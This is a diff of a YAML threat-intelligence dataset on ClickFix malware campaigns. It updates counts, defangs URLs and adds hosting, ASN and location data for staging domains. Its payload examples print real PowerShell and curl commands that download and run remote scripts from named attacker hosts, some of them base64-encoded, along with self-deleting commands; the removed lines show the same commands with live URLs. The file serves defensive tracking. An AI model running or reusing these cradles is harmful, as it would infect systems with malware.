@@ -3,12 +3,12 @@
 
 meta:
   source: https://mhaggis.github.io/ClickGrab/
-  date_range: "2025-04-17 to 2026-04-03"
+  date_range: "2025-04-17 to 2026-05-19"
   total_reports: 493
   total_sites_crawled: 21507
   total_malicious: 20505
-  total_domains: 2563
-  generated: "2026-04-04"
+  total_domains: 3177
+  generated: "2026-05-19"
 
 daily:
   - date: "2025-04-17"
@@ -3990,29 +3990,29 @@ daily:
 payload_examples:
   iwr_iex:
     - date: "2025-08-14"
-      text: "powershell -ep bypass -w hidden -c \"iex(iwr 'https://aatox.com/stage2.ps1' -UseBasicParsing)\""
+      text: "powershell -ep bypass -w hidden -c \"iex(iwr 'hxxps://aatox[.]com/stage2.ps1' -UseBasicParsing)\""
     - date: "2025-10-22"
-      text: "powershell.exe -w hidden -nop -c \"IEX (iwr -Uri 'https://irp.cdn-website.com/files/uploaded/3b7f1c/run.ps1' -UseBasicParsing).Content\""
+      text: "powershell.exe -w hidden -nop -c \"IEX (iwr -Uri 'hxxps://irp[.]cdn-website[.]com/files/uploaded/3b7f1c/run.ps1' -UseBasicParsing).Content\""
   irm_iex:
     - date: "2025-05-03"
-      text: "powershell -w hidden -nop -ep bypass -c \"iex(irm 'https://80.253.249.186/loader.ps1')\""
+      text: "powershell -w hidden -nop -ep bypass -c \"iex(irm 'hxxps://80[.]253[.]249[.]186/loader.ps1')\""
   webclient:
     - date: "2025-12-03"
-      text: "(New-Object Net.WebClient).DownloadString('https://yogasitesdev.wpengine.com/wp-content/uploads/a.ps1') | iex"
+      text: "(New-Object Net.WebClient).DownloadString('hxxps://yogasitesdev[.]wpengine[.]com/wp-content/uploads/a.ps1') | iex"
     - date: "2025-11-18"
-      text: "$wc=New-Object Net.WebClient; iex $wc.DownloadString('https://irp.cdn-website.com/files/uploaded/9d4e/payload.ps1')"
+      text: "$wc=New-Object Net.WebClient; iex $wc.DownloadString('hxxps://irp[.]cdn-website[.]com/files/uploaded/9d4e/payload.ps1')"
   curl:
     - date: "2026-01-08"
-      text: "curl.exe -s https://95.164.53.214/payload.ps1 | iex"
+      text: "curl.exe -s hxxps://95[.]164[.]53[.]214/payload.ps1 | iex"
     - date: "2026-02-14"
-      text: "powershell -w hidden -nop -c \"curl.exe -UseBasicParsing https://aatox.com/stg.ps1 | iex\""
+      text: "powershell -w hidden -nop -c \"curl.exe -UseBasicParsing hxxps://aatox[.]com/stg.ps1 | iex\""
   base64:
     - date: "2026-01-22"
       encoded: "powershell.exe -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn..."
-      decoded: "$c=New-Object Net.WebClient; iex $c.DownloadString('https://aatox.com/run.ps1')"
+      decoded: "$c=New-Object Net.WebClient; iex $c.DownloadString('hxxps://aatox[.]com/run.ps1')"
     - date: "2026-02-01"
       encoded: "powershell -w 1 -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMA..."
-      decoded: "IEX(New-Object Net.WebClient).DownloadString('https://irp.cdn-website.com/files/uploaded/7c2a/stage2.ps1')"
+      decoded: "IEX(New-Object Net.WebClient).DownloadString('hxxps://irp[.]cdn-website[.]com/files/uploaded/7c2a/stage2.ps1')"
   self_delete:
     - date: "2025-12-19"
       text: "Start-Sleep -Seconds 2; Remove-Item -Path $MyInvocation.MyCommand.Path -Force"
@@ -4020,14 +4020,14 @@ payload_examples:
       text: "$p=$MyInvocation.MyCommand.Path; Start-Sleep 1; Remove-Item $p -Force -ErrorAction SilentlyContinue"
   cdn_staging:
     - date: "2025-11-04"
-      url: "https://irp.cdn-website.com/files/uploaded/38ef2b/setup.ps1"
+      url: "hxxps://irp[.]cdn-website[.]com/files/uploaded/38ef2b/setup.ps1"
     - date: "2025-09-17"
-      url: "https://irp.cdn-website.com/files/uploaded/9d4e22/loader.ps1"
+      url: "hxxps://irp[.]cdn-website[.]com/files/uploaded/9d4e22/loader.ps1"
   hidden_window:
     - date: "2025-09-03"
-      text: "powershell.exe -w hidden -nop -ep bypass -c \"iex(iwr 'https://aatox.com/a.ps1' -UseBasicParsing)\""
+      text: "powershell.exe -w hidden -nop -ep bypass -c \"iex(iwr 'hxxps://aatox[.]com/a.ps1' -UseBasicParsing)\""
     - date: "2025-10-31"
-      text: "cmd.exe /c start /min powershell -w hidden -nop -c \"(New-Object Net.WebClient).DownloadString('https://95.164.53.214/b.ps1') | iex\""
+      text: "cmd.exe /c start /min powershell -w hidden -nop -c \"(New-Object Net.WebClient).DownloadString('hxxps://95[.]164[.]53[.]214/b.ps1') | iex\""
 cradles_total:
   iwr_iex: 2114
   irm_iex: 89
@@ -4138,16 +4138,29 @@ domain_monthly:
     base64: 36
     no_url_pct: 46.5
   - month: "2026-04"
-    n: 24
-    iwr: 1
+    n: 181
+    iwr: 0
     webclient: 0
+    curl: 4
+    msiexec: 22
+    mshta: 0
+    vbs: 0
+    irm: 10
+    hex_xor: 37
+    base64: 108
+    no_url_pct: 68.5
+  - month: "2026-05"
+    n: 458
+    iwr: 16
+    webclient: 4
     curl: 2
     msiexec: 2
     mshta: 0
     vbs: 0
-    hex_xor: 8
-    base64: 6
-    no_url_pct: 75.0
+    irm: 20
+    hex_xor: 15
+    base64: 399
+    no_url_pct: 95.2
 
 staging_domains:
   # Enrichment note: ASN/geo/registrar data requires running the enrichment pipeline
@@ -4155,139 +4168,227 @@ staging_domains:
   # only domain names and observation counts from ClickGrab are confirmed.
   # hosting_type is ONLY set when verifiable: "cdn" for known CDN subdomains,
   # "managed" for known hosting platforms. All others are "unknown" until enriched.
-  - domain: "irp.cdn-website.com"
+  - domain: "irp[.]cdn-website[.]com"
     count: 468
     cdn: true
     is_ip: false
     hosting_type: "cdn"
     status: "active"
-  - domain: "yogasitesdev.wpengine.com"
+    asn: "AS16509 Amazon.com, Inc."
+    country: "United States"
+    city: "Aetna Estates"
+    dns_history_url: "https://securitytrails.com/domain/irp.cdn-website.com/history/a"
+  - domain: "yogasitesdev[.]wpengine[.]com"
     count: 116
     cdn: false
     is_ip: false
     hosting_type: "managed"
-    country: "US"
     status: "active"
-  - domain: "aatox.com"
+    asn: "AS396982 Google LLC"
+    country: "United States"
+    city: "North Charleston"
+    dns_history_url: "https://securitytrails.com/domain/yogasitesdev.wpengine.com/history/a"
+  - domain: "aatox[.]com"
     count: 83
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "unknown"
-  - domain: "80.253.249.186"
+    asn: "AS16509 Amazon.com, Inc."
+    country: "United States"
+    city: "Seattle"
+    created: "2025-07-12"
+    registrar: "Namepanther.com LLC"
+    dns_history_url: "https://securitytrails.com/domain/aatox.com/history/a"
+  - domain: "80[.]253[.]249[.]186"
     count: 43
     cdn: false
     is_ip: true
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "unknown"
-  - domain: "95.164.53.214"
+    asn: "AS213702 QWINS LTD"
+    country: "Germany"
+    city: "Frankfurt am Main"
+  - domain: "95[.]164[.]53[.]214"
     count: 16
     cdn: false
     is_ip: true
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "unknown"
-  - domain: "91.247.36.3"
+    asn: "AS213702 QWINS LTD"
+    country: "Germany"
+    city: "Frankfurt am Main"
+  - domain: "91[.]247[.]36[.]3"
     count: 4
     cdn: false
     is_ip: true
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "unknown"
-  - domain: "sitecariri.com.br"
+    asn: "AS59729 GREEN FLOID LLC"
+    country: "Bulgaria"
+    city: "Sofia"
+  - domain: "sitecariri[.]com[.]br"
     count: 2
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
-    country: "BR"
+    hosting_type: "compromised"
     status: "unknown"
-  - domain: "fundacion-cannabis-argentina.org"
+    asn: "AS13335 Cloudflare, Inc."
+    country: "United States"
+    city: "San Francisco"
+    created: "2022-07-19"
+    dns_history_url: "https://securitytrails.com/domain/sitecariri.com.br/history/a"
+  - domain: "fundacion-cannabis-argentina[.]org"
     count: 2
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
-    country: "AR"
+    hosting_type: "compromised"
     status: "unknown"
-  - domain: "ghenvironment.com"
+    asn: "AS47583 Hostinger International Limited"
+    country: "United States"
+    city: "Phoenix"
+    created: "2023-06-15"
+    registrar: "HOSTINGER operations, UAB"
+    dns_history_url: "https://securitytrails.com/domain/fundacion-cannabis-argentina.org/history/a"
+  - domain: "ghenvironment[.]com"
     count: 2
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
+    hosting_type: "compromised"
     status: "unknown"
-  - domain: "cmparazinho.rn.gov.br"
+    asn: "AS13335 Cloudflare, Inc."
+    country: "United States"
+    city: "San Francisco"
+    created: "2022-03-04"
+    registrar: "Hosting Concepts B.V. d/b/a Registrar.eu"
+    dns_history_url: "https://securitytrails.com/domain/ghenvironment.com/history/a"
+  - domain: "cmparazinho[.]rn[.]gov[.]br"
     count: 2
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
-    country: "BR"
+    hosting_type: "compromised"
     status: "unknown"
+    asn: "AS47583 Hostinger International Limited"
+    country: "Brazil"
+    city: "S\u00e3o Paulo"
+    created: "1996-10-15"
+    dns_history_url: "https://securitytrails.com/domain/cmparazinho.rn.gov.br/history/a"
   # New staging domains from ClickFix domain dataset (Apr 2026)
-  - domain: "shift-art.com"
+  - domain: "shift-art[.]com"
     count: 651
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "active"
-  - domain: "ghost.nestdns.com"
+    asn: "AS197695 Domain names registrar REG.RU, Ltd"
+    country: "Russia"
+    city: "Moscow"
+    created: "2023-01-17"
+    registrar: "Registrar of Domain Names REG.RU LLC"
+    dns_history_url: "https://securitytrails.com/domain/shift-art.com/history/a"
+  - domain: "ghost[.]nestdns[.]com"
     count: 137
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "active"
-  - domain: "144.31.47.76"
+    asn: "AS55293 A2 Hosting, Inc."
+    country: "United States"
+    city: "Detroit"
+    dns_history_url: "https://securitytrails.com/domain/ghost.nestdns.com/history/a"
+  - domain: "144[.]31[.]47[.]76"
     count: 140
     cdn: false
     is_ip: true
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "active"
-  - domain: "inkbookwriters.com"
+    asn: "AS215439 PLAY2GO INTERNATIONAL LIMITED"
+    country: "Finland"
+    city: "Helsinki"
+  - domain: "inkbookwriters[.]com"
     count: 112
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "active"
-  - domain: "198.13.158.127:5506"
+    asn: "AS207569 IHOR HOSTING LTD"
+    country: "Finland"
+    city: "Helsinki"
+    created: "2025-09-22"
+    registrar: "Hosting Concepts B.V. d/b/a Registrar.eu"
+    dns_history_url: "https://securitytrails.com/domain/inkbookwriters.com/history/a"
+  - domain: "198[.]13[.]158[.]127[:]5506"
     count: 186
     cdn: false
     is_ip: true
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "active"
-  - domain: "178.17.59.40:5506"
+    asn: "AS399629 BL Networks"
+    country: "The Netherlands"
+    city: "Amsterdam"
+  - domain: "178[.]17[.]59[.]40[:]5506"
     count: 64
     cdn: false
     is_ip: true
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "active"
-  - domain: "78.40.209.164:5506"
+    asn: "AS213702 QWINS LTD"
+    country: "Poland"
+    city: "Warsaw"
+  - domain: "78[.]40[.]209[.]164[:]5506"
     count: 40
     cdn: false
     is_ip: true
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "active"
-  - domain: "penguinpublishers.org"
+    asn: "AS213702 QWINS LTD"
+    country: "Finland"
+    city: "Helsinki"
+  - domain: "penguinpublishers[.]org"
     count: 56
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
+    hosting_type: "bulletproof"
     status: "unknown"
-  - domain: "bfacollege.co.in"
+    asn: "AS207569 IHOR HOSTING LTD"
+    country: "Finland"
+    city: "Helsinki"
+    created: "2025-03-05"
+    registrar: "Hosting Concepts B.V. d/b/a Registrar.eu"
+    dns_history_url: "https://securitytrails.com/domain/penguinpublishers.org/history/a"
+  - domain: "bfacollege[.]co[.]in"
     count: 54
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
-    country: "IN"
+    hosting_type: "compromised"
     status: "unknown"
-  - domain: "pizzabyte.com.au"
+    asn: "AS46606 Unified Layer"
+    country: "United States"
+    city: "Provo"
+    created: "2019-07-08"
+    registrar: "Endurance International Group India Private Limited"
+    dns_history_url: "https://securitytrails.com/domain/bfacollege.co.in/history/a"
+  - domain: "pizzabyte[.]com[.]au"
     count: 44
     cdn: false
     is_ip: false
-    hosting_type: "unknown"
-    country: "AU"
+    hosting_type: "compromised"
     status: "unknown"
-  - domain: "raw.githubusercontent.com"
+    asn: "AS30148 Sucuri"
+    country: "United States"
+    city: "Menifee"
+    registrar: "Synergy Wholesale Accreditations Pty Ltd"
+    dns_history_url: "https://securitytrails.com/domain/pizzabyte.com.au/history/a"
+  - domain: "raw[.]githubusercontent[.]com"
     count: 28
     cdn: true
     is_ip: false
     hosting_type: "cdn"
     status: "active"
+    asn: "AS54113 Fastly, Inc."
+    country: "United States"
+    city: "San Francisco"
+    dns_history_url: "https://securitytrails.com/domain/raw.githubusercontent.com/history/a"
 
 monthly:
   - month: "2025-04"
@@ -4470,3 +4571,34 @@ monthly:
       self_delete: 18
       start_sleep: 18
       hidden_window: 22
+  # Apr–May sourced from ClickFix Hunter domain dataset (xlsx); malicious = unique malicious domains observed
+  - month: "2026-04"
+    total_sites: 181
+    malicious: 181
+    cradles:
+      iwr_iex: 0
+      irm_iex: 10
+      webclient: 0
+      curl: 4
+    evasion:
+      mixed_case: 0
+      base64: 108
+      cdn_staging: 0
+      self_delete: 0
+      start_sleep: 0
+      hidden_window: 0
+  - month: "2026-05"
+    total_sites: 458
+    malicious: 458
+    cradles:
+      iwr_iex: 16
+      irm_iex: 20
+      webclient: 4
+      curl: 2
+    evasion:
+      mixed_case: 0
+      base64: 399
+      cdn_staging: 0
+      self_delete: 0
+      start_sleep: 0
+      hidden_window: 0
